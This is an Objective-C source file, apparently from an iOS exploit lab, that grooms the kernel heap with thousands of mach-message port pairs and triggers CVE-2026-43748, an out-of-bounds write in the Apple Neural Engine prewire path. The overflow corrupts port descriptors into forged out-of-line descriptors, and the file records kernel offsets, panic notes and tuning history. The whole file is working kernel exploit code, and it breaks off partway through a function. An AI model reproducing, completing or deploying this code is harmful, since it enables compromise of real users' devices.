//
//  P099AnePrewireGroom.m — CVE-2026-43748 direct-path prewire OOB, groomed.
//  Recipe from the public vschko writeup; implementation is ours.
//  Bounded: 1 model, 1 evaluation, 2048 pairs, no loops.
//
//  MODEL PATH (cross-ref P046 PARK note "MIL _ANEModel CLOSED"): primary
//  loader is the bundled COMPILED espresso model (XVRC27_254in_1out_addchain
//  .mlmodelc) driven through CoreML's own ANE stack (P033-consistent).
//  The private _ANEModel MIL route is attempted only as a fallback and its
//  failure is expected per P046.
//
//  P046 pins (LabOff, 23F77): CheckandPrewire fffffff00874c070 fill_cap=0;
//  MemoryMap cmp fffffff00874c830 count_off=+0x810; ANE table=0x820
//  next-chunk=0xc0; n>=0xc1 reaches NEXT 3072 (0x3e0 past table end).
//  Fill order PROVED on F77: fill ALL records, THEN the +0x80 compare,
//  then IOFreeType (same-chunk smash freed with the map object).
//

#import "P099AnePrewireGroom.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <string.h>
#import <stdlib.h>
#import <fcntl.h>
#import <unistd.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <CoreFoundation/CoreFoundation.h>
#import "LabLocalTime.h"
#import "LabDeviceProfile.h"

#define P099_BUILD @"p099-aneprewire-v11-doordial-all"

#define P099_INPUT_COUNT 254
#define P099_OUTPUT_COUNT 1
#define P099_MODEL_KEY @"XVRC27/mach_msg_min/model.anehash"
#define P099_DRAIN_COUNT 2048
#define P099_PAIR_COUNT 2048
#define P099_PAYLOAD_SIZE 0xb80
#define P099_SURF_BYTES 602112

#pragma mark - log helpers

static int g_p099_fd = -1;
static NSMutableString *g_p099_buf;

static void p099_flush_line(NSString *out) {
    if (g_p099_buf) [g_p099_buf appendString:out];
    if (g_p099_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_p099_fd, s, strlen(s));
            fcntl(g_p099_fd, F_FULLFSYNC);
        }
    }
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    @synchronized ([P099AnePrewireGroom class]) { p099_flush_line(line); }
}

#pragma mark - private ANE interfaces (fallback route only)

@interface P099_ANEModel : NSObject
+ (id)modelAtURLWithSourceURL:(id)modelURL sourceURL:(id)sourceURL
                            key:(id)key cacheURLIdentifier:(id)cacheURLIdentifier;
- (unsigned long long)programHandle;
@end

@interface P099_ANEClient : NSObject
+ (id)sharedConnection;
- (BOOL)compileModel:(id)model options:(id)options qos:(unsigned)qos error:(NSError **)error;
- (BOOL)doLoadModel:(id)model options:(id)options qos:(unsigned)qos error:(NSError **)error;
- (BOOL)doEvaluateDirectWithModel:(id)model options:(id)options request:(id)request
                              qos:(unsigned)qos error:(NSError **)error;
@end

@interface P099_ANEIOSurfaceObject : NSObject
+ (id)objectWithIOSurface:(void *)surface;
@end

@interface P099_ANERequest : NSObject
+ (id)requestWithInputs:(id)inputs inputIndices:(id)inputIndices
                outputs:(id)outputs outputIndices:(id)outputIndices
         procedureIndex:(id)procedureIndex;
- (BOOL)validate;
@end

#pragma mark - IOSurface (dlsym-only per AGENTS.md)

static void *(*p099_surf_create)(CFDictionaryRef);
static uint32_t (*p099_surf_getid)(void *);
static CFTypeRef (*p099_surf_lookup)(uint32_t);
static size_t (*p099_surf_allocsz)(void *);
static CFStringRef p099_key_w, p099_key_h, p099_key_bpe, p099_key_bpr, p099_key_alloc;

static BOOL p099_load_iosurface_syms(void) {
    void *f = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!f) f = RTLD_DEFAULT;
    p099_surf_create = dlsym(f, "IOSurfaceCreate");
    p099_surf_getid = dlsym(f, "IOSurfaceGetID");
    p099_surf_lookup = dlsym(f, "IOSurfaceLookup");
    p099_surf_allocsz = dlsym(f, "IOSurfaceGetAllocSize");
    p099_key_w = dlsym(f, "kIOSurfaceWidth");
    p099_key_h = dlsym(f, "kIOSurfaceHeight");
    p099_key_bpe = dlsym(f, "kIOSurfaceBytesPerElement");
    p099_key_bpr = dlsym(f, "kIOSurfaceBytesPerRow");
    p099_key_alloc = dlsym(f, "kIOSurfaceAllocSize");
    return p099_surf_create && p099_key_alloc;
}

static void *p099_make_surface_for_idx(uint32_t idx) {
    NSDictionary *props = @{
        (__bridge id)p099_key_w: @(P099_SURF_BYTES / 4),
        (__bridge id)p099_key_h: @1,
        (__bridge id)p099_key_bpe: @4,
        (__bridge id)p099_key_bpr: @(P099_SURF_BYTES),
        (__bridge id)p099_key_alloc: @(P099_SURF_BYTES)
    };
    (void)idx;
    return p099_surf_create((__bridge CFDictionaryRef)props);
}

#pragma mark - mach message groom

typedef struct { mach_port_t hole; mach_port_t victim; } p099_pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[P099_PAYLOAD_SIZE];
} p099_msg_t;

static void p099_fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < P099_PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }
    uint64_t magic = role ? 0x56494354584C4D31ULL : 0x484F4C45584C4D31ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = P099_PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, 8);
    memcpy(p + 0x08, &index, 4);
    memcpy(p + 0x0c, &role, 4);
    memcpy(p + 0x10, &len, 8);
    memcpy(p + 0x18, &marker, 8);
    /* v3 geomap: mark every 16B slot's tail half 0xEE (slots >= 0x20 so the
       header words at 0x00-0x1f survive). A record slot overwrites the tail
       with the marshal's fixed qword -> unmistakable in the decode. */
    for (size_t off = 0x20; off + 8 <= P099_PAYLOAD_SIZE; off += 16) {
        memset(p + off, 0xEE, 8);
    }
}

static mach_port_t p099_make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) return 0;
    if (mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) return 0;
    return port;
}

/* INLINE messages on purpose: P044 found "fat type-3 OOL is the conversion
   neighbor" — OOL descriptors carry descriptor words the prewire smash
   would corrupt into descriptor tampering. Inline payloads are plain
   kalloc.3072 data: the OOB lands in payload bytes we can diff. */
static BOOL p099_send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    /* T8150-aware sizing (note 189): kmsg must size to the ane element class
       or kalloc_type sequesters kmsg vs IOMallocType. A14 0x820 table -> the
       existing p099_msg_t shape; T8150 0x10b8 -> msgh_size = class - 0x24. */
    uint32_t tbl = 0x820u;
    const LabOffTab *poff = LabOff();
    if (poff && poff->ane_table_size) tbl = poff->ane_table_size;
    static p099_msg_t *big_msg = NULL;
    static uint32_t big_tbl = 0;
    if (tbl != 0x820u) {
        if (!big_msg || big_tbl != tbl) {
            free(big_msg);
            big_msg = calloc(1, sizeof(p099_msg_t) - 0x24 + tbl); /* oversize tail, safe */
            big_tbl = tbl;
        }
        if (!big_msg) return NO;
    }
    p099_msg_t *msg = (tbl == 0x820u) ? calloc(1, sizeof(p099_msg_t)) : big_msg;
    if (!msg) return NO;
    mach_msg_size_t send_sz = (tbl == 0x820u) ? (mach_msg_size_t)sizeof(p099_msg_t)
                                              : (mach_msg_size_t)(tbl - 0x24);
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (tbl == 0x820u) ? (mach_msg_size_t)sizeof(p099_msg_t) : send_sz;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58590000u | ((role & 0xffu) << 8) | (index & 0xffu));
    p099_fill_payload(msg->bytes, index, role);
    kern_return_t kr = mach_msg(&msg->hdr, MACH_SEND_MSG, ((msg->hdr.msgh_size) ? msg->hdr.msgh_size : (mach_msg_size_t)sizeof(p099_msg_t)),
                                0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    free(msg);
    return kr == MACH_MSG_SUCCESS;
}

static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
    uint8_t rbuf[P099_PAYLOAD_SIZE + sizeof(mach_msg_header_t) + 0x400];
    p099_msg_t *msg = (p099_msg_t *)rbuf;
    memset(rbuf, 0, sizeof(rbuf));
    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                sizeof(rbuf), port, 1000, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS && payloadOut) {
        if (msg->hdr.msgh_size < sizeof(mach_msg_header_t) + P099_PAYLOAD_SIZE) {
            return MACH_RCV_TOO_LARGE;
        }
        memcpy(payloadOut, msg->bytes, P099_PAYLOAD_SIZE);
    }
    return kr;
}

#pragma mark - v6 door round (portkind victims)

static uint32_t g_p099_portkindN;  /* dial: last N victims send as portkind (0 = unchanged) */

/* v6 door: 16 fresh port-kind descriptors + the p099 payload marker AFTER
   the desc block, sized to stay in the kalloc.3072 class (msg 0xB60 ->
   kdata 0xB84 <= 0xC00). Shape = p073's proven send_portkind (accepted
   kr=0 on 23F77 AND 24A435): MACH_MSG_PORT_DESCRIPTOR + COPY_SEND per
   fresh right; rights released post-send by the kernel send path. */
#define P099_PK_N_DESC   16u
/* v8 CLASS LAW (19:40 door round): the door victims MUST sit in the SAME
   kalloc magazine as the ANE record area (0x820 class on A14 / the 0x10b8
   class on T8150) — the 0xB68 victims were in the 0xC00-class magazine and
   the fill's record stream could not cross their desc blocks. v8 sizes the
   portkind victim to the LabOff runtime class: kdata_class - 0x24 (msgh). */
static uint32_t p099_pk_len(void) {
    uint32_t kdata = 0x820u;
    const LabOffTab *o99 = LabOff();
    if (o99 && o99->ane_table_size >= 0x300 && o99->ane_table_size <= 0x4000)
        kdata = o99->ane_table_size;
    return kdata - 0x24u;
}
static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
    const uint32_t PK_LEN = p099_pk_len();  /* 0x7FC on A14 = kdata 0x820 */
    uint8_t *buf = calloc(1, PK_LEN + 1);
    if (!buf) return NO;
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    mach_msg_body_t *bd = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    bd->msgh_descriptor_count = P099_PK_N_DESC;
    mach_port_t dp[P099_PK_N_DESC];
    uint32_t made;
    for (made = 0; made < P099_PK_N_DESC; made++) {
        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)
            (buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + made * 0xCu);
        dp[made] = p099_make_port();
        if (!dp[made]) break;
        d->name        = dp[made];
        d->disposition = MACH_MSG_TYPE_COPY_SEND;
        d->type        = MACH_MSG_PORT_DESCRIPTOR;
    }
    if (made != P099_PK_N_DESC) { free(buf); return NO; }
    const uint32_t PK_PAY = PK_LEN - 0x20u - 0x8u - P099_PK_N_DESC * 0xCu;
    uint8_t *payload = buf + 0x20u + 0x8u + P099_PK_N_DESC * 0xCu;
    /* same fingerprint pattern as p099_fill_payload, sized for the door msg */
    for (uint32_t i = 0; i < PK_PAY; i++)
        payload[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^ (uint8_t)(i * 13u));
    uint64_t magic = 0x484F4C45584C4D31ULL;   /* HOLEXLM1 */
    memcpy(payload + 0x00, &magic, 8);
    uint32_t idx = index, role = 1;
    memcpy(payload + 0x08, &idx, 4);
    memcpy(payload + 0x0c, &role, 4);
    for (uint32_t off = 0x20; off + 8 <= PK_PAY; off += 16)
        memset(payload + off, 0xEE, 8);
    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    h->msgh_size = (mach_msg_size_t)PK_LEN;
    h->msgh_remote_port = port;
    h->msgh_local_port  = MACH_PORT_NULL;
    h->msgh_id          = (mach_msg_id_t)(0x58590000u | (0x01u << 8) | (index & 0xffu));
    kern_return_t kr = mach_msg(h, MACH_SEND_MSG, (mach_msg_size_t)PK_LEN,
                                0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    free(buf);
    if (kr != MACH_MSG_SUCCESS) {
        L(@"[v6] portkind victim=%u send kr=0x%x (%s)", index, kr, mach_error_string(kr));
        return NO;
    }
    return YES;
}

/* v6 door readback (p073 v7d/v9 law inlined): clean port desc =
   {name u32, pad u32, type u16 0, disp u16 0x11}; a fill record
   {sid, flags 0xcx, tail 0x0000000100000001} on a desc reads
   type=0x0001 (OOL-forged) = the conversion door — probe the 64-bit
   address field fault-safely (mach_vm_read_overwrite via dlsym). */
static BOOL p099_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
    typedef kern_return_t (*p099_vmread_t)(mach_port_t, uint64_t, uint64_t,
                                           uint64_t, uint64_t *);
    static p099_vmread_t vr;
    if (!vr) vr = (p099_vmread_t)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
    if (!vr || !out) return NO;
    uint64_t got = 0;
    kern_return_t kr = vr(mach_task_self(), addr, (uint64_t)n,
                          (uint64_t)(uintptr_t)out, &got);
    return kr == KERN_SUCCESS && got >= 4;
}

static int g_p099_oolHits;
/* v11 door-run totals: per-door-round read/clean/smash census — the verdict
   speaks in door terms. (The v7/v8 snapshot-DIFFERS law is REMOVED: it
   flagged our own msgh_id low bytes + legit translated names as "desc words
   touched" on 20:01/v8 and 20:19/v10; the v9 per-desc pad law is the only
   smash signal that counts.) */
static uint32_t g_p099_dvRead, g_p099_dvClean, g_p099_dvSmash;

static void p099_dump_hexline(const uint8_t *b, uint32_t n, uint32_t base,
                              const char *tag) {
    NSMutableString *h = [NSMutableString string];
    for (uint32_t k = 0; k < n; k++) [h appendFormat:@"%02x", b[k]];
    L(@"[v7] %s +0x%02x..%02x %@", tag, base, base + n - 1, h);
}

static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
    uint8_t rbuf[0x1400];
    memset(rbuf, 0, sizeof rbuf);
    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
    kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                sizeof rbuf, port, 0, MACH_PORT_NULL);
    if (kr == MACH_RCV_TIMED_OUT) { L(@"[v6] door victim=%u EMPTY (still queued?)", idx); return; }
    if (kr != MACH_MSG_SUCCESS) {
        L(@"[v6] door victim=%u recv mr=0x%x — DESC PROCESSING REJECTED (forged desc seen!)",
          idx, kr);
        return;
    }
    if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) { L(@"[v7] door victim=%u simple", idx); return; }
    /* v7: raw dump FIRST — head + first 0x50 desc-block bytes (the per-desc
       v9 pad law below is the only smash verdict; no snapshot diffing). */
    p099_dump_hexline(rbuf, 0x20, 0, "raw");
    p099_dump_hexline(rbuf + 0x20, 0x40, 0x20, "raw");
    uint32_t cnt = ((mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t)))->msgh_descriptor_count;
    uint32_t smashes = 0;
    for (uint32_t i = 0; i < cnt && i < P099_PK_N_DESC; i++) {
        uint8_t *dp = rbuf + sizeof(mach_msg_header_t) + 0x8u + i * 0xCu;
        uint32_t name, padw; uint16_t dtype, ddisp;
        memcpy(&name, dp + 0, 4); memcpy(&padw, dp + 4, 4);
        memcpy(&dtype, dp + 8, 2); memcpy(&ddisp, dp + 10, 2);
        /* v9 TRUE clean law (the 19:47 v8-round bytes): a clean arm64 wire
           port-desc = bytes @4-7 == 00 00 11 00 (pad1:16=0; disposition
           0x11 @6; type 0 @7). The 0x11 must be @+6 — NOT @+5 — and the
           per-victim name word @8-11 legitimately differs (it is the
           translated port name); name/pad@0-7 = the smash-detect words. */
        BOOL clean = (dp[4] == 0 && dp[5] == 0 && dp[6] == 0x11 && dp[7] == 0x00);
        if (clean) continue;
        smashes++;
        L(@"[v6] DOOR SMASH victim=%u desc[%u] name=0x%08x pad=0x%08x type=0x%04x disp=0x%04x "
          @"(record: sid=%u flags=0x%08x)", idx, i, name, padw, dtype, ddisp, name, padw);
        if (dtype == 0x0001u) {
            uint64_t addr = (uint64_t)name | ((uint64_t)padw << 32);
            uint8_t ool[32]; memset(ool, 0xCC, sizeof ool);
            if (p099_vmread(addr, ool, sizeof ool)) {
                BOOL nonzero = NO, kptr = NO;
                for (uint32_t k2 = 0; k2 < 8; k2++) if (ool[k2] != 0xCC) { nonzero = YES; break; }
                for (uint32_t k2 = 0; k2 + 8 <= sizeof ool; k2 += 8) {
                    uint64_t q; memcpy(&q, ool + k2, 8);
                    if (q >= 0xFFFFFE0000000000ULL && q < 0xFFFFFFF000000000ULL) kptr = YES;
                }
                if (nonzero || kptr) {
                    g_p099_oolHits++;
                    L(@"[v6] OOL COPYOUT victim=%u desc=%u addr=0x%012llx readable=YES "
                      @"kernelRange=%d bytes %02x %02x %02x %02x %02x %02x %02x %02x",
                      idx, i, addr, kptr,
                      ool[0], ool[1], ool[2], ool[3], ool[4], ool[5], ool[6], ool[7]);
                } else {
                    L(@"[v6] door victim=%u desc=%u OOL addr=0x%012llx = zeroed (no copyout this shape)", idx, i, addr);
                }
            } else {
                L(@"[v6] door victim=%u desc=%u OOL addr=0x%012llx unreadable (EFAULT — honest)",
                  idx, i, addr);
            }
        }
    }
    g_p099_dvRead++;
    g_p099_dvSmash += smashes;
    if (!smashes) g_p099_dvClean++;
    if (smashes) L(@"[v7] door verdict victim=%u smashes=%u oolHits=%u", idx, smashes, g_p099_oolHits);
}

@implementation P099AnePrewireGroom

+ (NSString *)tap {
    @synchronized ([P099AnePrewireGroom class]) {
        g_p099_buf = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"p099_aneprewire_log.txt"];
        g_p099_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_APPEND, 0644);

        L(@"=== p099 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P099_BUILD);
        L(@"CVE-2026-43748 ANE direct-path prewire OOB (0x80 table vs 0xff limit),");
        L(@"GROOMED: OOB lands in freed INLINE mach-msg victims, not gzalloc");
        L(@"metadata. The ungroomed shape is panic #1-#3 (wild write, x25 =");
        L(@"FAR-0xc00, stride 0xc0 = record 0xc0 crossing at +0xc00).");
        L(@"geomap (Ghidra fffffff00874c070): record = [sid u32][flags][000][tail],");
        L(@"tail in=0x0000000100000001 out=0x0000000200000001; flags = RECORD INDEX.");
        L(@"v3 tap PROVED: visible spill in a kmsg victim starts at record 195");
        L(@"(flag 0xc3) at body+0x0000; out record (254, tail {1,2}) at body+0x3b0;");
        L(@"records 192-194 land in the kmsg kernel-header region (not copied out).");
        L(@"P034 v2 pin: ANE object kdata = 0x820 (kalloc.3072, band 0x801-0xc00)");
        L(@"= 0x800 record area (128 slots) + metadata @0x800/0x810; records 128+");
        L(@"overrun element slack; record 192+ = NEXT element. Consume aim: A rec");
        L(@"192+k -> B object slot k; A out -> B slot 62 = B input 62 (127-in B).");
        L(@"v4 resolves record sids via IOSurfaceLookup (LIVE = our own staging).");
        {
            const LabOffTab *off = LabOff();
            L(@"P046 pins: fill_cap=%u on %s; late cmp at count_off +0x810;",
              off ? off->ane_fill_cap : 0u, (off && off->tag) ? off->tag : "?");
        }
        L(@"table 0x820, next-chunk 0xc0; n>=0xc1 reaches NEXT 3072.");
        L(@"One evaluation. STANDALONE ONLY - not in PATCH chain.");
        L(@"Probe app: fire even on fill_cap / unknown SKU. Public Lum1na is the SKU gate.");
        L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");
        L(@"%@", [LabDeviceProfile huntTapWarn:@"p099"] ?: @"");
        [LabDeviceProfile stampLastTap:@"p099"];

        // ---- v6 dial: Documents/p099_victim.txt "portkind=N" (last N victims as door rounds) ----
        g_p099_portkindN = 0;
        {
            NSString *dialP = [docs stringByAppendingPathComponent:@"p099_victim.txt"];
            NSFileManager *fm99 = [NSFileManager defaultManager];
            if (![fm99 fileExistsAtPath:dialP]) {
                /* v6b stage: the default door-round dial is WRITTEN on first
                   run so the door is armed on-device without an external
                   push; v10 refreshes by dialver. */
                NSString *def = @"dialver=11\nportkind=2048\n";
                if ([def writeToFile:dialP atomically:YES
                            encoding:NSUTF8StringEncoding error:nil])
                    L(@"[v11] STAGED door dial (portkind=2048, dialver=11); ALL victims = door rounds");
            } else {
                /* v10→v11: the record-crossing element WANDERS boot-to-boot
                   (v8 boot: in-flight victim 1981; v10 clean boot: no
                   visible landing at all) — no fixed tail band covers a
                   wanderer. v11 makes EVERY victim a portkind door victim,
                   so wherever the record stream crosses, it crosses
                   in-flight kmsg descs; the door pad law (v9) + [door]
                   totals carry the verdict. */
                NSString *cur = [NSString stringWithContentsOfFile:dialP
                    encoding:NSUTF8StringEncoding error:nil];
                if (cur && ![cur containsString:@"dialver=11"]) {
                    NSString *defref = @"dialver=11\nportkind=2048\n";
                    if ([defref writeToFile:dialP atomically:YES
                            encoding:NSUTF8StringEncoding error:nil])
                        L(@"[v11] dial default refreshed → portkind=2048 (dialver=11)");
                }
            }
            if ([fm99 fileExistsAtPath:dialP]) {
                NSString *dial = [NSString stringWithContentsOfFile:dialP
                    encoding:NSUTF8StringEncoding error:nil];
                NSRange r = [dial rangeOfString:@"portkind="];
                if (r.location != NSNotFound) {
                    int v = [dial substringFromIndex:NSMaxRange(r)].intValue;
                    if (v > 0 && v <= (int)P099_PAIR_COUNT) g_p099_portkindN = (uint32_t)v;
                }
                L(@"[v6] dial portkind=%u (Documents/p099_victim.txt; last %u victims = door rounds)",
                  g_p099_portkindN, g_p099_portkindN);
            }
        }
        if ([LabDeviceProfile aneFillCapped]) {
            L(@"EXPECT-BAD fill_cap=1. 254-in CheckandPrewire on this SKU -> 0xe00002c2. Probe still fires.");
        } else if (LabOff() && LabOff()->ane_table_size && LabOff()->ane_table_size != 0x820u) {
            L(@"EXPECT-BAD ane_table_size=0x%x (T8150 0x10b8, not A14 0x820). Probe still fires.",
              LabOff()->ane_table_size);
        } else if (!LabOff()) {
            L(@"EXPECT-BAD LabOff NULL (iPhone18,1/18,3 unknown). Probe still fires.");
        }

        NSBundle *b = [NSBundle mainBundle];

        // ---- groom state (built before evaluation, whichever path loads) ----

        // ---- groom state (built before evaluation, whichever path loads) ----
        __block p099_pair_t *pairs = calloc(P099_PAIR_COUNT, sizeof(p099_pair_t));
        __block mach_port_t *drain = calloc(P099_DRAIN_COUNT, sizeof(mach_port_t));
        BOOL groomReady = (pairs != NULL && drain != NULL);
        int drainOK = 0, pairOK = 0, holesFreed = 0;
        /* v3 geomap: sid -> request-position table for the record decode */
        uint32_t inSids[P099_INPUT_COUNT];
        uint32_t outSidCap = 0;
        memset(inSids, 0, sizeof(inSids));
        if (groomReady) {
            for (uint32_t i = 0; i < P099_DRAIN_COUNT; i++) {
                drain[i] = p099_make_port();
                if (drain[i] && p099_send_msg(drain[i], i, 2)) drainOK++;
            }
            for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                pairs[i].hole = p099_make_port();
                pairs[i].victim = p099_make_port();
                BOOL pkVictim = (g_p099_portkindN &&
                                 i >= P099_PAIR_COUNT - g_p099_portkindN);
                if (pairs[i].hole && pairs[i].victim &&
                    p099_send_msg(pairs[i].hole, i, 0) &&
                    (pkVictim
                        ? p099_send_portkind_victim(pairs[i].victim, i)
                        : p099_send_msg(pairs[i].victim, i, 1))) pairOK++;
            }
            for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                if (pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
            }
        }
        sync();
        L(@"[*] groom: drain=%d/%d pairs=%d/%d holes-freed=%d",
          drainOK, P099_DRAIN_COUNT, pairOK, P099_PAIR_COUNT, holesFreed);
        if (!groomReady) L(@"[!] groom alloc failed - continuing WITHOUT holes (higher panic risk)");

        // ---- PRIMARY: bundled compiled espresso model via CoreML (P033 path) ----
        BOOL evaluated = NO;
        // Lum1na bundles Resources/ane as an explicitFolder (bundle: ane/...);
        // the P007 lab app has it at bundle root. Try subdirectory first.
        NSURL *compiledURL = [b URLForResource:@"XVRC27_254in_1out_addchain"
                                 withExtension:@"mlmodelc"
                                  subdirectory:@"ane"];
        if (!compiledURL) {
            compiledURL = [b URLForResource:@"XVRC27_254in_1out_addchain"
                              withExtension:@"mlmodelc"];
        }
        if (compiledURL) {
            L(@"[*] PRIMARY model: %@ (compiled espresso; MIL _ANEModel is PARK-closed per P046)",
              compiledURL.lastPathComponent);
            NSError *err = nil;
            MLModelConfiguration *cfg = [MLModelConfiguration new];
            cfg.computeUnits = MLComputeUnitsAll;
            MLModel *model = [MLModel modelWithContentsOfURL:compiledURL
                                               configuration:cfg error:&err];
            if (model) {
                // 254 scalar inputs x_000..x_253, output y = sum.
                NSMutableDictionary<NSString *, MLFeatureValue *> *features =
                    [NSMutableDictionary dictionaryWithCapacity:P099_INPUT_COUNT];
                double expected = 0.0;
                BOOL featOK = YES;
                for (uint32_t i = 0; i < P099_INPUT_COUNT; i++) {
                    NSError *ferr = nil;
                    MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[@1]
                                                                  dataType:MLMultiArrayDataTypeDouble
                                                                     error:&ferr];
                    if (!arr) { featOK = NO; break; }
                    double v = (double)(i + 1);
                    arr[0] = @(v);
                    expected += v;
                    features[[NSString stringWithFormat:@"x_%03u", i]] =
                        [MLFeatureValue featureValueWithMultiArray:arr];
                }
                if (featOK) {
                    MLDictionaryFeatureProvider *provider =
                        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
                    if (provider) {
                        id<MLFeatureProvider> pred = [model predictionFromFeatures:provider error:&err];
                        if (pred) {
                            MLFeatureValue *yv = [pred featureValueForName:@"y"];
                            double got = yv.multiArrayValue ? yv.multiArrayValue[0].doubleValue : -1;
                            L(@"[*] inference ok y[0]=%.0f expected=%.0f", got, expected);
                        } else {
                            L(@"[-] prediction failed: %@ (model may not delegate to ANE on this SKU)",
                              err ? err.localizedDescription : @"?");
                        }
                        evaluated = YES;
                    } else {
                        L(@"[-] feature provider failed: %@", err.localizedDescription);
                    }
                } else {
                    L(@"[-] MLMultiArray create failed - honest miss.");
                }
            } else {
                L(@"[-] MLModel load failed: %@", err ? err.localizedDescription : @"?");
            }
        } else {
            L(@"[-] bundled XVRC27_254in_1out_addchain.mlmodelc missing from app bundle.");
        }

        // ---- SECONDARY: private _ANEModel MIL route (P046 says CLOSED; honest try) ----
        if (!evaluated) {
            if (!NSClassFromString(@"_ANEModel")) {
                dlopen("/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine", RTLD_NOW | RTLD_GLOBAL);
            }
            Class modelCls = NSClassFromString(@"_ANEModel");
            Class clientCls = NSClassFromString(@"_ANEClient");
            Class surfCls = NSClassFromString(@"_ANEIOSurfaceObject");
            Class reqCls = NSClassFromString(@"_ANERequest");
            NSString *modelDir = [b pathForResource:@"model" ofType:nil inDirectory:@"ane"];
            if (!modelDir) modelDir = [b pathForResource:@"model" ofType:nil];
            BOOL modelFiles = modelDir &&
                [[NSFileManager defaultManager] fileExistsAtPath:
                  [modelDir stringByAppendingPathComponent:@"model.mil"]];
            if (modelCls && clientCls && surfCls && reqCls && modelFiles) {
                L(@"[*] SECONDARY: _ANEModel MIL route (expect CLOSED per P046 - honest try) ...");
                NSURL *modelURL = [NSURL fileURLWithPath:modelDir isDirectory:YES];
                NSDictionary *opts = @{
                    @"kANEFModelCacheIdentifierUsingSourceURLKey": @YES,
                    @"kANEFCompilationInitiatedByE5MLKey": @YES,
                    @"kANEFCompilerOptionsFilenameKey": @"options.plist",
                    @"kANEFModelType": @"kANEFModelMIL",
                    @"kANEFNetPlistFilenameKey": @"model.mil",
                };
                P099_ANEClient *client = [clientCls sharedConnection];
                P099_ANEModel *model = [modelCls modelAtURLWithSourceURL:modelURL
                                                               sourceURL:modelURL
                                                                     key:P099_MODEL_KEY
                                                      cacheURLIdentifier:nil];
                NSError *err = nil;
                BOOL ok = client && model && [client compileModel:model options:opts qos:2 error:&err];
                L(@"[*] MIL compile ok=%d err=%@", ok, err ? err.localizedDescription : @"-");
                if (ok) {
                    ok = [client doLoadModel:model options:opts qos:2 error:&err];
                    unsigned long long ph = [model programHandle];
                    L(@"[*] MIL load ok=%d programHandle=0x%llx", ok, ph);
                    if (ok && ph) {
                        NSMutableArray *inputs = [NSMutableArray arrayWithCapacity:P099_INPUT_COUNT];
                        NSMutableArray *inIdx = [NSMutableArray arrayWithCapacity:P099_INPUT_COUNT];
                        NSMutableArray *outputs = [NSMutableArray arrayWithCapacity:P099_OUTPUT_COUNT];
                        NSMutableArray *outIdx = [NSMutableArray arrayWithCapacity:P099_OUTPUT_COUNT];
                        for (uint32_t i = 0; i < P099_INPUT_COUNT; i++) {
                            void *s = p099_make_surface_for_idx(i);
                            if (!s) { ok = NO; break; }
                            inSids[i] = p099_surf_getid ? (uint32_t)p099_surf_getid(s) : 0u;
                            [inputs addObject:[surfCls objectWithIOSurface:s]];
                            [inIdx addObject:@(i)];
                        }
                        for (uint32_t i = 0; i < P099_OUTPUT_COUNT && ok; i++) {
                            void *s = p099_make_surface_for_idx(0xF0 + i);
                            if (!s) { ok = NO; break; }
                            outSidCap = p099_surf_getid ? (uint32_t)p099_surf_getid(s) : 0u;
